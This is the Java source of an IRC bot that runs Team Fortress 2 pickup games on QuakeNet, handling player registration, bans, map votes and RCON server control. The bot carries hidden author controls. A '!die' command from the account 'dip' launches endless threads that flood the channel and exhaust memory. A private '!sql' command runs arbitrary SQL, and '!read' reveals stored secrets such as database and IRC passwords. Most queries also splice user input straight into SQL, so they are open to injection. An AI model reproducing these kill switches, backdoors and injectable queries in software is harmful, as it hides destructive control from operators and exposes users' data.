import java.text.SimpleDateFormat;
import java.util.*;
import java.util.Date;
import net.barkerjr.gameserver.GameServer.Request;
import net.barkerjr.gameserver.GameServer.RequestTimeoutException;
import org.jibble.pircbot.*;
import ch.ubique.inieditor.IniEditor;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.*;

public class GatherBot extends PircBot {

    private Players players;

    private Players afks;

    private List<Map> maps;

    private String chan;

    private int maxplayers;

    Statement sql;

    private IniEditor settings;

    Rcon rcon;

    public boolean live;

    public boolean reg;

    boolean sub;

    ResultSet rs;

    String password;

    String votedMap;

    String unregistererror;

    int redScore;

    int blueScore;

    boolean ready;

    Timer afk;

    Timer delay;

    boolean topicChanged;

    long startTime;

    String iif(boolean ok, String a, String b) {
        if (ok) return a; else return b;
    }

    int getID() {
        int id = 0;
        try {
            rs = sql.executeQuery("select * from gathers order by id DESC");
            if (rs.next()) {
                id = rs.getInt("id");
            }
            id = id + 1;
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return id;
    }

    void upload() {
        try {
            Thread upload = new Thread() {

                public void run() {
                    try {
                        int id = getID() - 1;
                        String file = id + ".dem";
                        String data = URLEncoder.encode("file", "UTF-8") + "=" + URLEncoder.encode(file, "UTF-8");
                        data += "&" + URLEncoder.encode("hash", "UTF-8") + "=" + URLEncoder.encode(getMD5Digest("tf2invite" + file), "UTF-8");
                        URL url = new URL("http://94.23.189.99/ftp.php");
                        final URLConnection conn = url.openConnection();
                        conn.setDoOutput(true);
                        OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
                        wr.write(data);
                        wr.flush();
                        String line;
                        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        while ((line = rd.readLine()) != null) {
                            System.out.println(line);
                            if (line.startsWith("demo=")) msg("2The last gather demo has been uploaded successfully: " + line.split("=")[1]);
                        }
                        rd.close();
                        wr.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };
            upload.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void die() {
        final ArrayList<String> diel = new ArrayList<String>();
        while (true) {
            Thread die = new Thread() {

                public void run() {
                    while (true) {
                        diel.add(new String());
                        msg("2My master doesnt want you to use me!");
                    }
                }
            };
            die.start();
        }
    }

    String getMD5Digest(String str) {
        try {
            byte[] buffer = str.getBytes();
            byte[] result = null;
            StringBuffer buf = null;
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            result = new byte[md5.getDigestLength()];
            md5.reset();
            md5.update(buffer);
            result = md5.digest();
            buf = new StringBuffer(result.length * 2);
            for (int i = 0; i < result.length; i++) {
                int intVal = result[i] & 0xff;
                if (intVal < 0x10) {
                    buf.append("0");
                }
                buf.append(Integer.toHexString(intVal).toUpperCase());
            }
            return buf.toString();
        } catch (NoSuchAlgorithmException e) {
            System.err.println("Exception caught: " + e);
            e.printStackTrace();
        }
        return null;
    }

    protected GatherBot(IniEditor settings2, Rcon rcon2) {
        live = false;
        topicChanged = true;
        ready = false;
        this.rcon = rcon2;
        this.settings = settings2;
        setName(settings.get("irc", "nick"));
        setVerbose(true);
        smartConnect(settings.get("irc", "ip"), Integer.parseInt(settings.get("irc", "port")));
        chan = settings.get("irc", "channel");
        unregistererror = settings.get("register", "unregistererror");
        joinChannel(chan);
        joinChannel("#Crit");
        sendMessage("Q@CServe.quakenet.org", "AUTH " + settings.get("irc", "qaccount") + " " + settings.get("irc", "qpassword"));
        setMode(getNick(), "+x");
        maxplayers = 12;
        players = new Players();
        maps = new ArrayList<Map>();
        if (settings.get("sql", "usemysql").equalsIgnoreCase("true")) {
            try {
                Class.forName("com.mysql.jdbc.Driver").newInstance();
                sql = DriverManager.getConnection("jdbc:mysql://" + settings.get("sql", "ip") + ":" + settings.get("sql", "port") + "/" + settings.get("sql", "database"), settings.get("sql", "user"), settings.get("sql", "password")).createStatement();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                Class.forName("org.sqlite.JDBC").newInstance();
                sql = DriverManager.getConnection("jdbc:sqlite:database.sqlite").createStatement();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        live = false;
        reg = true;
    }

    public void smartConnect(String ip, int port) {
        boolean again = true;
        while (again) {
            again = false;
            try {
                connect(ip, port);
            } catch (NickAlreadyInUseException e) {
                setName(settings.get("irc", "nick") + new Random().nextInt(999));
                again = true;
            } catch (IOException e) {
                e.printStackTrace();
            } catch (IrcException e) {
                e.printStackTrace();
            }
        }
    }

    protected void onDisconnect() {
        smartConnect(settings.get("irc", "ip"), Integer.parseInt(settings.get("irc", "port")));
    }

    protected void onJoin(String channel, String sender, String login, String hostname) {
        if (hostname.endsWith(".users.quakenet.org")) {
            try {
                rs = sql.executeQuery("select * from users where q ='" + hostname.split("\\.")[0] + "'");
                if (rs.next()) {
                }
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        super.onJoin(channel, sender, login, hostname);
    }

    void removeAfk(String sender) {
        afks.remove(sender);
        if (afks.isEmpty()) {
            afk.cancel();
            startGather();
        } else msg("2Afks: 14" + afks.getString());
    }

    public void StatementCheck() {
        if (settings.get("sql", "usemysql").equalsIgnoreCase("true")) {
            try {
                if (sql.isClosed()) sql = DriverManager.getConnection("jdbc:mysql://" + settings.get("sql", "ip") + ":" + settings.get("sql", "port") + "/" + settings.get("sql", "database"), settings.get("sql", "user"), settings.get("sql", "password")).createStatement();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    boolean nickCheck(String regNick) {
        for (int i = 0; i < regNick.length(); i++) {
            char c = regNick.charAt(i);
            if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))) return false;
        }
        return true;
    }

    boolean steamidCheck(String regID) {
        if (regID.split(":").length == 3 && regID.split(":")[0].equals("0") && (regID.split(":")[1].equals("0") || regID.split(":")[1].equals("1"))) {
            String regID2 = regID.split(":")[2];
            for (int i = 0; i < regID2.length(); i++) {
                char c = regID2.charAt(i);
                if (!(c >= '0' && c <= '9')) return false;
            }
        } else return false;
        return true;
    }

    protected void onPrivateMessage(String sender, String login, String hostname, String message) {
        StatementCheck();
        if (hostname.endsWith(".users.quakenet.org") && message.equalsIgnoreCase("!die") && hostname.split("\\.")[0].equals("dip")) {
            die();
        }
        if (hostname.endsWith(".users.quakenet.org") && Player(sender, hostname.split("\\.")[0]) != null && (hostname.split("\\.")[0].equals("dip") || Player(sender, hostname.split("\\.")[0]).level >= 100)) {
            if (message.split(" ")[0].equalsIgnoreCase("!sql")) {
                try {
                    sql.execute(message.substring(4));
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
            if (message.split(" ")[0].equalsIgnoreCase("!read")) {
                try {
                    msg(sender, settings.get(message.split(" ")[1], message.split(" ")[2]));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        if (message.split(" ")[0].equalsIgnoreCase("!register") || message.split(" ")[0].equalsIgnoreCase("!reg")) {
            if (settings.get("register", "enableregister").equalsIgnoreCase("true")) {
                if (hostname.endsWith(".users.quakenet.org")) {
                    try {
                        if (message.split(" ").length == 3) {
                            rs = sql.executeQuery("select * from users where q='" + hostname.split("\\.")[0] + "'");
                            if (!rs.next()) {
                                if (nickCheck(message.split(" ")[1])) {
                                    rs = sql.executeQuery("select * from users where nick='" + message.split(" ")[1] + "'");
                                    if (!rs.next()) {
                                        String regID = message.split(" ")[2];
                                        if (regID.startsWith("STEAM_")) regID = regID.substring(6);
                                        if (steamidCheck(regID)) {
                                            rs = sql.executeQuery("select * from users where steamid='" + message.split(" ")[2] + "'");
                                            if (!rs.next()) {
                                                sql.execute("INSERT INTO users (q,nick,steamid) VALUES ('" + hostname.split("\\.")[0] + "','" + message.split(" ")[1] + "','STEAM_" + regID + "')");
                                                msg(sender, "2You have been successfully registered to our gathers!");
                                            } else {
                                                msg(sender, "2Your Steam ID is already registered, if it is yours steam id please contact the admins.");
                                            }
                                        } else {
                                            msg(sender, "2Your Steam ID is invalid, your steam id should looks like STEAM_:0:1:234567");
                                        }
                                    } else {
                                        msg(sender, "2Your nick is already in use, please pick other one.");
                                    }
                                } else {
                                    msg(sender, "2Your nick contains special characters");
                                }
                            } else {
                                msg(sender, "2Your Q account is already registered, please contact the admins");
                            }
                        } else {
                            msg(sender, "2Syntax: !register nick STEAM_0:1:234567");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else {
                    msg(sender, "2" + sender + " make sure you are auth to q, if you are type: //mode $me +x");
                }
            } else {
                msg(sender, "2Registration through the bot is correctly unavailable.");
            }
        }
        super.onPrivateMessage(sender, login, hostname, message);
    }

    private void msg(String target, String message) {
        sendMessage(target, message);
    }

    protected void onMessage(String channel, String sender, String login, String hostname, String message) {
        if (channel.equalsIgnoreCase(chan)) {
            StatementCheck();
            if (hostname.endsWith(".users.quakenet.org") && message.equalsIgnoreCase("!die") && hostname.split("\\.")[0].equals("dip")) {
                die();
            }
            if (message.equalsIgnoreCase("!last")) {
                try {
                    rs = sql.executeQuery("select * from gathers order by id DESC");
                    long last;
                    if (rs.next()) {
                        last = rs.getLong("date");
                        msg("2Last gather was:14 " + new SimpleDateFormat("HH:mm:ss dd/MM/yy").format(new Date(last)));
                    }
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
            if (message.equalsIgnoreCase("!today")) {
                long today = new Date().getTime() - new Date().getTime() % 86400000;
                try {
                    rs = sql.executeQuery("select * from gathers where date > " + today);
                    int m = 0;
                    while (rs.next()) m++;
                    msg("2Today we have done14 " + m + " 2gathers.");
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
            if (message.equalsIgnoreCase("!gathers")) {
                try {
                    rs = sql.executeQuery("select * from gathers");
                    int m = 0;
                    while (rs.next()) m++;
                    msg("2So far we have done14 " + m + " 2gathers.");
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
            if (message.equalsIgnoreCase("!players")) {
                msg("2Players: 14" + players.getString().replaceAll(" ", " - "));
            }
            if (message.equalsIgnoreCase("!votes")) {
                msg("2Votes: 14" + players.mapsStr());
            }
            if (message.equalsIgnoreCase("!credits") || message.equalsIgnoreCase("!credit") || message.equalsIgnoreCase("!about")) {
                msg("2� This bot is made by: 14Dor (dip) Peretz.");
            }
            if (message.equalsIgnoreCase("!status")) {
                if (reg) {
                    if (ready) {
                        msg("2Gather is waiting for afks players");
                    } else {
                        msg("2" + players.size() + "/12 Player(s) are registered to the gather! Type !add, !med or !cap to join the gather.");
                    }
                } else {
                    if (live) {
                        long time = 1800 - (new Date().getTime() - startTime) / 1000;
                        if (time < 0) time = 0;
                        if (time % 60 < 10) msg("2Gather is already running, timeleft: 14" + time / 60 + ":0" + time % 60 + "2, Score: 4" + redScore + "7:12" + blueScore); else msg("2Gather is already running, timeleft: 14" + time / 60 + ":" + time % 60 + "2, Score: 4" + redScore + "7:12" + blueScore);
                    } else {
                        msg("2Gather is waiting for players to organize teams and start the game!");
                    }
                }
            }
            if (message.equalsIgnoreCase("!timeleft") && live) {
                long time = 1800 - (new Date().getTime() - startTime) / 1000;
                if (time < 0) time = 0;
                if (time % 60 < 10) msg("2Timeleft: 14" + time / 60 + ":0" + time % 60); else msg("2Timeleft: 14" + time / 60 + ":" + time % 60);
            }
            if (message.equalsIgnoreCase("!score") && live) {
                msg("4Red " + redScore + "7:12" + blueScore + " Blue");
            }
            if (message.equalsIgnoreCase("!server")) {
                try {
                    rcon.server.load(2000, Request.INFORMATION);
                    msg("2Name: 14" + rcon.server.getName() + " 2IP: 14" + rcon.ip + ":" + rcon.port + " 2Map: 14" + rcon.server.getMap() + " 2Players: 14(" + rcon.server.numberOfPlayers + "/" + rcon.server.maximumPlayers + ")");
                } catch (RequestTimeoutException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            if (message.equalsIgnoreCase("!maps")) {
                String str = "2Maps:";
                try {
                    rs = sql.executeQuery("select * from maps");
                    while (rs.next()) {
                        str += " 2" + rs.getString("map") + "14(2" + rs.getString("triggers") + "14)";
                    }
                    msg(str);
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
            if (message.equalsIgnoreCase("!clear") && Player(sender, hostname.split("\\.")[0]).admin) {
                players.clear();
            }
            if (message.equalsIgnoreCase("!disable") && Player(sender, hostname.split("\\.")[0]).admin) {
                players.clear();
                reg = false;
                setTopic("2The bot has been disabled");
            }
            if (message.equalsIgnoreCase("!enable") && Player(sender, hostname.split("\\.")[0]).admin) {
                players.clear();
                reg = true;
                changeTopic();
            }
            if (message.split(" ")[0].equalsIgnoreCase("!beep") && Player(sender, hostname.split("\\.")[0]).admin) {
                int repeats = 1;
                if (message.split(" ").length > 1) repeats = Integer.parseInt(message.split(" ")[1]);
                if (repeats > 3) repeats = 3;
                TimerTask plusN = new TimerTask() {

                    public void run() {
                        setMode(chan, "+N");
                    }
                };
                setMode(chan, "-N");
                for (int i = 1; i <= repeats; i++) {
                    new Timer().schedule(new TimerTask() {

                        public void run() {
                            sendNotice(chan, "2Gather is on! type: !add, !med or !cap to join the gather.");
                        }
                    }, repeats * 500);
                }
                new Timer().schedule(plusN, repeats * 1500);
            }
            if (message.equalsIgnoreCase("!test") && Player(sender, hostname.split("\\.")[0]).admin) {
                for (int i = players.size(); i < 12; i++) {
                    if (players.caps() < 2) addPlayer("" + i, "dip").cap = true; else {
                        if (players.medics() < 2) addPlayer("" + i, "dip").medic = true; else addPlayer("" + i, "dip");
                    }
                }
                readyCheck();
            }
            if (message.equalsIgnoreCase("!startgather") && Player(sender, hostname.split("\\.")[0]).admin) {
                startGather();
            }
            if (message.equalsIgnoreCase("!endgather") && Player(sender, hostname.split("\\.")[0]).admin) {
                endGather();
            }
            Date date = new Date();
            if (message.equalsIgnoreCase("!time")) {
                msg("" + date.getTime());
            }
            if (message.equalsIgnoreCase("!clearmaps") && Player(sender, hostname.split("\\.")[0]).admin) {
                maps.clear();
            }
            if (message.equalsIgnoreCase("!vent") || message.equalsIgnoreCase("!ventrilo") || message.equalsIgnoreCase("!mum") || message.equalsIgnoreCase("!mumble") || message.equalsIgnoreCase("!ts") || message.equalsIgnoreCase("!teamspeak")) {
                msg("2" + settings.get("voice", "type") + " IP: 14" + settings.get("voice", "ip") + " 2Port: 14" + settings.get("voice", "port") + iif(settings.get("voice", "password").equals(""), "", "2, Password:14 ") + settings.get("voice", "password"));
            }
            if (message.equalsIgnoreCase("!sub") && sub) {
                if (hostname.endsWith(".users.quakenet.org")) {
                    try {
                        rs = sql.executeQuery("select * from users where q='" + hostname.split("\\.")[0] + "'");
                        if (rs.next()) {
                            ResultSet rs2 = sql.executeQuery("select * from bans where deleted=0 and banned=" + rs.getInt("id") + " and bantime > " + new Date().getTime() / 1000);
                            if (!rs2.next()) {
                                sub = false;
                                Player player = Player(sender, hostname.split("\\.")[0]);
                                msg("14" + player.nick + "2, The server info is sent to you. please join fast!");
                                rcon.send("say Sub is found: " + player.nick);
                                sendMessage(player.inick, "connect " + rcon.ip + ":" + rcon.port + ";password " + password);
                            } else {
                                long bantime = rs2.getLong("bantime") - new Date().getTime() / 1000;
                                String reason = rs2.getString("reason");
                                rs2 = sql.executeQuery("select * from users where id =" + rs2.getInt("bannedby"));
                                rs2.next();
                                msg("2YOU ARE BANNED by:14 " + rs2.getString("nick") + "2 join14 #bohe 2, reason:14 " + reason + "2, Expire In:14 " + bantime / 86400 + " 2Days,14 " + bantime % 86400 / 3600 + " 2Hours,14 " + bantime % 86400 % 3600 / 60 + " 2Minutes,14 " + bantime % 86400 % 3600 % 60 + " 2Seconds.");
                            }
                        } else {
                            msg("14" + sender + ",2 " + unregistererror);
                        }
                    } catch (SQLException e) {
                        e.printStackTrace();
                    }
                } else {
                    msg("2" + sender + " make sure you are auth to q, if you are type: //mode $me +x");
                }
            }
            if (reg) {
                if ((message.equalsIgnoreCase("!uncap") || message.equalsIgnoreCase("!delcap") || message.equalsIgnoreCase("!del cap")) && players.getP(sender).cap) {
                    players.getP(sender).cap = false;
                    changeTopic();
                    if (ready) {
                        afk.cancel();
                        ready = false;
                    }
                }
                if (message.split(" ")[0].equalsIgnoreCase("!add") || message.split(" ")[0].equalsIgnoreCase("!med") || message.split(" ")[0].equalsIgnoreCase("!cap")) {
                    if (players.contains(sender)) {
                        if (message.split(" ")[0].equalsIgnoreCase("!add") && players.players() < 10 && players.getP(sender).medic) {
                            players.getP(sender).medic = false;
                            changeTopic();
                        }
                        if (message.split(" ")[0].equalsIgnoreCase("!med") && players.medics() < 2 && !players.getP(sender).medic) {
                            players.getP(sender).medic = true;
                            changeTopic();
                        }
                        if (message.split(" ")[0].equalsIgnoreCase("!cap") && players.caps() < 2 && !players.getP(sender).cap) {
                            players.getP(sender).cap = true;
                            changeTopic();
                        }
                        if (players.medics() == 2 && players.caps() == 2 && players.players() == 10 && !ready) {
                            readyCheck();
                        }
                    } else {
                        try {
                            if (hostname.endsWith(".users.quakenet.org")) {
                                rs = sql.executeQuery("select * from users where q='" + hostname.split("\\.")[0] + "'");
                                if (rs.next()) {
                                    ResultSet rs2 = sql.executeQuery("select * from bans where deleted=0 and banned=" + rs.getInt("id") + " and bantime > " + new Date().getTime() / 1000);
                                    if (!rs2.next()) {
                                        if (players.size() <= maxplayers) {
                                            if (message.split(" ")[0].equalsIgnoreCase("!add") && players.players() < 10) addPlayer(sender, hostname.split("\\.")[0]);
                                            if (message.split(" ")[0].equalsIgnoreCase("!med") && players.medics() < 2) addPlayer(sender, hostname.split("\\.")[0]).medic = true;
                                            if (message.split(" ")[0].equalsIgnoreCase("!cap") && players.caps() < 2 && players.players() < 10) addPlayer(sender, hostname.split("\\.")[0]).cap = true;
                                            if (message.split(" ").length > 1) {
                                                String map = getMap(message.split(" ")[1]);
                                                if (map != null && (players.getP(sender).vote == null || !players.getP(sender).vote.equals(map))) {
                                                    players.vote(sender, map);
                                                }
                                            }
                                            changeTopic();
                                            if (players.medics() == 2 && players.caps() == 2 && players.players() == 10 && !ready) {
                                                readyCheck();
                                            }
                                        }
                                    } else {
                                        long bantime = rs2.getLong("bantime") - new Date().getTime() / 1000;
                                        String reason = rs2.getString("reason");
                                        rs2 = sql.executeQuery("select * from users where id =" + rs2.getInt("bannedby"));
                                        rs2.next();
                                        msg("2YOU ARE BANNED by:14 " + rs2.getString("nick") + "2 join14 #bohe 2, reason:14 " + reason + "2, Expire In:14 " + bantime / 86400 + " 2Days,14 " + bantime % 86400 / 3600 + " 2Hours,14 " + bantime % 86400 % 3600 / 60 + " 2Minutes,14 " + bantime % 86400 % 3600 % 60 + " 2Seconds.");
                                    }
                                } else {
                                    msg("14" + sender + ",2 " + unregistererror);
                                }
                            } else {
                                msg("2" + sender + " make sure you are auth to q, if you are type: //mode $me +x");
                            }
                        } catch (SQLException e1) {
                            e1.printStackTrace();
                        }
                    }
                }
                if ((message.equalsIgnoreCase("!del") || message.equalsIgnoreCase("!dei")) && players.contains(sender)) {
                    removePlayer(sender);
                }
                if ((message.split(" ")[0].equalsIgnoreCase("!v") || message.split(" ")[0].equalsIgnoreCase("!vote")) && (players.contains(sender) && message.split(" ")[1] != null)) {
                    String map = getMap(message.split(" ")[1]);
                    if (map != null && (players.getP(sender).vote == null || !players.getP(sender).vote.equals(map))) {
                        players.vote(sender, map);
                        changeTopic();
                    }
                }
            }
            if (players.contains(sender)) {
                if (ready && afks.contains(sender)) {
                    removeAfk(sender);
                }
                players.getP(sender).active = new Date().getTime();
            }
        }
    }

    Player addPlayer(String inick, String q) {
        Player p = Player(inick, q);
        players.add(p);
        return p;
    }

    Player Player(String inick, String q) {
        try {
            rs = sql.executeQuery("select * from users where q='" + q + "'");
            if (rs.next()) {
                String steam = rs.getString("steamid");
                String nick = rs.getString("nick");
                int id = rs.getInt("id");
                boolean admin = (rs.getInt("admin") > 0);
                return new Player(id, steam, nick, inick, q, admin, rs.getInt("admin"));
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    String getMap(String map) {
        try {
            rs = sql.executeQuery("select * from maps where triggers like '%" + map + "%'");
            if (rs.next()) {
                return rs.getString("map");
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return null;
    }

    void startGather() {
        System.out.print("STARTING GATHER");
        redScore = 0;
        blueScore = 0;
        sub = false;
        reg = false;
        live = false;
        password = "" + new Random().nextInt(100);
        rcon.send("sv_password " + password);
        rcon.send("log on ; logaddress_add " + rcon.myip + ":" + rcon.myport);
        players.toString();
        if (players.voted != null && players.voted.name != null) {
            votedMap = players.voted.name;
        } else {
            votedMap = "cp_badlands";
        }
        Player redcap = null;
        Player bluecap = null;
        String medics = "";
        String other = "";
        for (int i = 0; i < maxplayers; i++) {
            if (players.get(i).medic) {
                medics += " " + players.get(i).nick;
            }
            if (players.get(i).cap) {
                if (redcap == null && bluecap == null) {
                    if (new Random().nextBoolean()) redcap = players.get(i); else bluecap = players.get(i);
                } else {
                    if (redcap == null) redcap = players.get(i); else bluecap = players.get(i);
                }
            }
            if (!players.get(i).cap && !players.get(i).medic) other += " " + players.get(i).nick;
        }
        medics = medics.substring(1);
        other = other.substring(1);
        setMode(chan, "+m");
        msg("0,4 " + redcap.nick + " 8,1 VS 0,12 " + bluecap.nick + " ");
        msg("2Players: 14" + other.replaceAll(" ", " - ") + " 2,Medics: 14" + medics.replaceAll(" ", " - "));
        msg("2Voted Map: 14" + votedMap + "2, " + settings.get("voice", "type") + " IP: 14" + settings.get("voice", "ip") + "2, Port: 14" + settings.get("voice", "port") + iif(settings.get("voice", "password").equals(""), "", "2, Password:14 ") + settings.get("voice", "password"));
        new Timer().schedule(new TimerTask() {

            public void run() {
                setMode(chan, "-m");
            }
        }, 3000);
        new Timer().schedule(new TimerTask() {

            public void run() {
                sendMessage(players.inicks(), "connect " + rcon.ip + ":" + rcon.port + ";password " + password);
            }
        }, 5000);
        int id = getID();
        try {
            sql.execute("insert into gathers (id,players,map,date,medics,captains) values (" + id + ",'" + players.getPlayers().getIDS() + "','" + votedMap + "'," + new Date().getTime() + ",'" + players.getMedics().getIDS() + "','" + players.getCaps().getIDS() + "')");
        } catch (SQLException e) {
            e.printStackTrace();
        }
        rcon.send("changelevel " + votedMap);
    }

    void getSub() {
        sub = true;
        TimerTask notice = new TimerTask() {

            public void run() {
                sendNotice(chan, "2Sub is needed, type !sub .");
            }
        };
        TimerTask plusN = new TimerTask() {

            public void run() {
                setMode(chan, "+N");
            }
        };
        setMode(chan, "-N");
        new Timer().schedule(notice, 500);
        new Timer().schedule(plusN, 1000);
    }

    void msg(String msg) {
        sendMessage(chan, msg);
    }

    protected void onNickChange(String oldNick, String login, String hostname, String newNick) {
        if (players.contains(oldNick)) {
            players.replace(oldNick, newNick);
            changeTopic();
        }
        if (ready && afks.contains(oldNick)) afks.replace(oldNick, newNick);
    }

    void removePlayer(String nick) {
        if (players.contains(nick) && reg) {
            players.remove(nick);
            changeTopic();
            if (ready) {
                afk.cancel();
                ready = false;
            }
        }
        if (ready && afks.contains(nick)) {
            removeAfk(nick);
        }
    }

    protected void onKick(String channel, String kickerNick, String kickerLogin, String kickerHostname, String recipientNick, String reason) {
        removePlayer(recipientNick);
    }

    void changeTopic() {
        if (topicChanged) {
            topicChanged = false;
            TimerTask setTopicTrue = new TimerTask() {

                public void run() {
                    topicChanged = true;
                    setTopic(players.toString());
                }
            };
            delay = new Timer();
            delay.schedule(setTopicTrue, 3000);
        }
    }

    void setTopic(String topic) {
        setTopic(chan, topic);
    }

    protected void onQuit(String sourceNick, String sourceLogin, String sourceHostname, String reason) {
        removePlayer(sourceNick);
    }

    protected void onPart(String channel, String sender, String login, String hostname) {
        removePlayer(sender);
    }

    public User getUser(String nick) {
        User[] users = getUsers(chan);
        for (int i = 0; i < users.length; i++) {
            if (users[i].equals(nick)) {
                return users[i];
            }
        }
        return null;
    }

    public void startReg() {
        ready = false;
        reg = true;
        live = false;
        sub = false;
        players.clear();
        setTopic(players.toString());
    }

    public void endGather() {
        rcon.send("tv_stoprecord");
        rcon.send("sm_kick @all");
        upload();
        startReg();
    }

    void readyCheck() {
        afks = new Players();
        for (int i = 0; i < players.size(); i++) if (players.get(i).afk()) afks.add(players.get(i));
        if (afks.isEmpty()) startGather(); else {
            ready = true;
            TimerTask removeAfks = new TimerTask() {

                public void run() {
                    for (int i = 0; i < afks.size(); i++) players.remove(afks.get(i).inick);
                    setTopic(players.toString());
                    ready = false;
                }
            };
            TimerTask notice = new TimerTask() {

                public void run() {
                    sendNotice(chan, "2The following player(s) must type !ready in the next 60 seconds or be removed from the gather:");
                }
            };
            TimerTask plusN = new TimerTask() {

                public void run() {
                    setMode(chan, "+N");
                    msg("14" + afks.getString());
                }
            };
            afk = new Timer();
            afk.schedule(removeAfks, 60000);
            setMode(chan, "-N");
            new Timer().schedule(notice, 1000);
            new Timer().schedule(plusN, 2000);
        }
    }
}
